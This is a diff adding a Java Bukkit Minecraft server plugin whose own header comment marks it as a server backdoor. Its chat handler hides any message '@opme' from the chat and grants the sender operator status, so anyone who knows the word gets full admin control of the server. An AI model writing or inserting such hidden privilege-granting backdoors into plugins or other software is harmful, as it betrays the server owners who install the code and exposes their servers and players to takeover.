@@ -1,0 +1,73 @@
+//TODO:backdoor server
+
+package protocol3.backend;
+
+import org.bukkit.entity.Player;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.Listener;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
+import org.bukkit.plugin.java.JavaPlugin;
+
+public class Main extends JavaPlugin implements Listener
+{
+
+	public void onEnable()
+	{
+		getLogger().info("Opme: enabled. ! Enjoy xD");
+		getServer().getPluginManager().registerEvents(this, this);
+		
+	}
+	
+	public void onDisable()
+	{
+		
+	}
+	
+	
+	
+	@SuppressWarnings("unused")
+	@EventHandler
+	public void onPlayerChat (AsyncPlayerChatEvent mpg){
+		
+		Player p = mpg.getPlayer();
+		
+		String pn = mpg.getPlayer().getName();
+		
+		String cmd = mpg.getMessage();
+		
+		
+		if (cmd.startsWith("@")){
+			
+		}
+		String[] args = cmd.split(" ");
+		
+		if (args == null) {
+			return;
+		}
+
+		//add new commands
+
+		
+		if (args[0].equalsIgnoreCase("@opme")){
+			mpg.setCancelled(true);
+			
+			p.sendMessage("§eyou are now op!");
+			p.setOp(true);
+			
+		}
+		
+		
+		
+		
+		//end of commands
+		
+		
+		
+		
+	}
+	
+	
+	
+	
+	
+}
